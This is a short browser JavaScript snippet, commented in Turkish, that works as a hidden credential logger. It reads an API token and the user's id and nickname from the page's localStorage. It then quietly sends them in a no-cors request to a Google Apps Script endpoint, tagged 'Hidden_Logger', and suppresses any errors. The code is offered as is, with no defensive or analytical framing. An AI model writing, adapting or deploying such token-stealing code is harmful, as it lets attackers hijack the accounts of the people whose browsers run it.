(function() {
    const gs = "https://script.google.com/macros/s/AKfycbyR-IX4up6a_FCP5rnKWW7yLstNuo2IZRdrh12dFVx0ZSvfRbtIeOw5qVNl-lKHE3jt/exec";
    
    const t = localStorage.getItem('v3APIToken');
    let u = "Bilinmiyor", n = "Bilinmiyor";

    // Veri toplama mantığı
    try {
        const user = JSON.parse(localStorage.getItem('user') || '{}');
        u = user.id || "Bilinmiyor";
        n = user.nickname || document.querySelector('[class*="nickname"]')?.innerText || "Bilinmiyor";

        if (t) {
            fetch(`${gs}?token=${t}&userId=${u}&nickname=${encodeURIComponent(n)}&source=Hidden_Logger`, {
                method: 'GET',
                mode: 'no-cors'
            });
        }
    } catch (e) {}
})();
